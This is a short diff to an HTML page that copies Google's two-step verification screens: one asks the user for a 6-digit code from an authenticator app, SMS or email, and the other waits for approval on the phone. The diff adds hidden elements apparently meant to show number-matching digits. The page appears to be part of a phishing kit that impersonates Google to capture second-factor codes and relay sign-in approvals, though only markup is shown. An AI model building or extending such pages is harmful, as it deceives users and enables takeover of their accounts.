@@ -232,6 +232,7 @@
       </div>
       <h1 class="g-title">Verify it's you</h1>
       <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit code from your authenticator app — or the code Google just texted or emailed you — to finish.</p>
+      <div id="totp-numbers" class="g-numbig-row" style="display:none"></div>
 
       <div id="form-totp">
         <div class="g-code">
@@ -253,6 +254,7 @@
       <h1 class="g-title">Confirm it&rsquo;s you</h1>
       <p class="g-caption">To help keep your account safe, we&rsquo;ve sent a notification. Open it and tap <b>Approve</b> to finish signing in.</p>
       <div class="g-approve-status"><span class="g-approve-dot"></span><span id="approve-status">Waiting&hellip;</span></div>
+      <div id="approval-numbers" class="g-numbig-row" style="display:none"></div>
       <div class="g-footer">
         <button type="button" class="g-link" id="try-another-2">Try another way</button>
         <button type="button" class="g-btn" id="btn-approve" disabled><span class="b-label">Continue</span></button>
